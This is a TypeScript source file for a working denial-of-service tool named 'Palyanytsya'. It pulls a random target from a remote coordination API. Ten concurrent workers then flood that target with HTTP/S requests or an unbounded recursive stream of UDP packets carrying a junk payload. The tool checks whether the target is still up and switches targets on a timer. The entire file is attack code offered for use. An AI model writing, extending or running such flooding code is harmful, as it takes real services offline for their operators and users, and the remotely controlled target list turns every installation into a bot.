/* eslint-disable @typescript-eslint/ban-ts-comment */
import axios, { AxiosError } from 'axios'
import Colors from 'colors';
import * as DGram from 'dgram';
import delay from 'delay';
import throttle from 'lodash/throttle';
import { logError, logRainbow, logInfo, logSuccess } from './log';

const PAYLOAD = '!@_n15=-1n1,,5<%@!%.>{424}_;}{[42424242]-[424JIROINj521n9558n15N%1n019505%)(@!%N!%%!()%!^)@!*!^)!N^n66n1l.6[pn1[6pn^NO^1-6-1n61-n6161=-6[1NO^Pn1i60n9i1n69016n16n16nop12k6np1on6k1p<>A<?>W<N,./awn,525n1;5';
const WORKERS_COUNT = 10;
const ATTACKS_PER_TARGET = 10
const CHANGE_TARGET_DELAY_MIN = 30;
const AVAILABLE_PROTOCOLS = ['http', 'https', 'udp', 'tcp'];
const FAILED_CODES = ['EADDRNOTAVAIL', 'ECONNRESET', 'ECONNABORTED'];
const API_HOST = process.env.API_HOST || 'http://localhost';

interface Target {
  path: string;
  port: number | string;
  protocol: string;
}

class Palyanytsya {
  private target: Target | null = null;
  private working: boolean;
  private resetting = false;
  private udpClient: DGram.Socket;
  private lastAvailabilityTimestamp: number = Date.now();
  private isTargetAvailable = true;

  constructor () {
    this.working = false;
    this.udpClient = DGram.createSocket('udp4');
  }

  get targetProtocol (): string {
    const protocol = this?.target?.protocol ?? '';

    const isCorrectProtocol = AVAILABLE_PROTOCOLS.includes(protocol.toLowerCase());

    return isCorrectProtocol ? protocol.toLowerCase() : 'http';
  }

  get port (): string {
    const port = this?.target?.port ?? '';

    if (port === 'null' || !port) {
      switch (this.targetProtocol) {
        case 'http':
          return '80';
        case 'https':
          return '443';
        case 'udp':
          return '53';
        default:
          return '80';
      }
    }

    return String(port);
  }

  async loadTarget () {
    try {
      const response = await axios.get(`${API_HOST}/targets/random-target`)
      this.target = response.data as Target;
      logInfo(`Start working with target ${this.target.path} on port ${this.target.port} via ${this.target.protocol} protocol.`);
    } catch (err) {
      logError('ERROR WHILE FETCHING TARGET');
      throw new Error('ERROR WHILE FETCHING TARGET')
    }
  }

  start () {
    this.working = true
    this.resetting = false;
    const delayToFindNewTarget = 1000 * 60 * CHANGE_TARGET_DELAY_MIN;

    for (let i = 0; i < WORKERS_COUNT; i++) {
      setImmediate(() => {
        this.worker().catch(err => {
          logError(`Shit happens. Error while start worker. ${(err as Error).message}`)
        })
      });
    }

    logSuccess('ALL WORKERS STARTED')

    setTimeout(() => {
      void this.restart();
    }, delayToFindNewTarget)
  }

  stop () {
    this.working = false
  }

  async restart () {
    if (this.resetting) return;
    this.resetting = true;
    this.working = false;

    logRainbow('Service restarting and trying to find new target.', 'RESTARTING');
    
    await delay(5000);
    await this.loadTarget();
    
    logRainbow('Service restarted. Target found!', 'RESTARTING');
    
    await delay(1000);

    this.start();
  }

  async testHttpAvailability () {
    const { path = '', port = 80 } = this.target || {}; 
    const targetPath = `${this.targetProtocol}://${path}${port ? `:${port}` : ''}`;

    try {
      const response = await axios.get(targetPath, { timeout: 10000 });

      return response.status === 200
    } catch (e) {
      logError('Current target unavailable. New target will be loaded soon.');
      return false
    }
  }

  async httpAttack () {
    const currentTimestamp = Date.now();
    const isAvailabilityCheckNeeded = ((currentTimestamp - this.lastAvailabilityTimestamp) / 1000) > 120;
    
    if (isAvailabilityCheckNeeded) {
      this.isTargetAvailable = await this.testHttpAvailability();
    }
   
    if (!this.isTargetAvailable) {
      await this.restart();
      return;
    }

    const path = this.target?.path ?? ''; 
    const targetPath = `${this.targetProtocol}://${path}${this.port ? `:${this.port}` : ''}`;

    try {
      await axios.get(targetPath, { timeout: 10000 });
      logInfo(`The payload has been send to ${targetPath} via ${this.targetProtocol.toUpperCase()} protocol.`);
    } catch (err) {
      logError(`HTTP/S REQUEST - ${(err as AxiosError)?.message}. Path: [${Colors.bgRed(targetPath)}]`);

      if (FAILED_CODES.includes((err as AxiosError).code as string)) {
        await this.restart();
      }
    }
  }

  async tcpAttack () {
    logInfo('TCP Attack is in development. Palyanytsya will be restarted with another target');

    await this.restart();
  }

  async udpAttack () {
    await delay(200);

    const { path = '' } = this.target || {}; 

    this.udpClient.send(PAYLOAD, Number(this.port), path);

    logInfo(`The payload has been send to ${path}${this.port ? `:${this.port}` : ''} via ${this.targetProtocol.toUpperCase()} protocol.`);
    this.udpAttack().catch((err) => {
      logError(`UDP REQUEST - ${(err as Error)?.message}`);
    });
  }

  attack () {
    if (!this.target) {
      logError('Attack error. Target is wrong.');
      return;
    }

    const { protocol = '' } = this?.target || {};

    switch (protocol.toLowerCase()) {
      case 'tcp':
        void this.tcpAttack();
        break;
      case 'udp':
        void this.udpAttack();
        break;
      case 'http':
        void this.httpAttack();
        break;
      case 'https':
        void this.httpAttack();
        break;
      default:
        logError(`Can not start, please check protocol value. ${protocol} is wrong.`);
        break;
    }
  }

  async worker () {
    const throttledAttack = throttle(this.attack.bind(this), 100);

    while (this.working) {
      await delay(200);

      for (let attackIndex = 0; (attackIndex < ATTACKS_PER_TARGET) && this.working; attackIndex++) {
        try {
          throttledAttack();
        } catch (err) {
          logError(`Error while performing request. ${(err as Error)?.message}.`);
          throw new Error();
        }
      }
    }
  }
}

export default Palyanytsya;
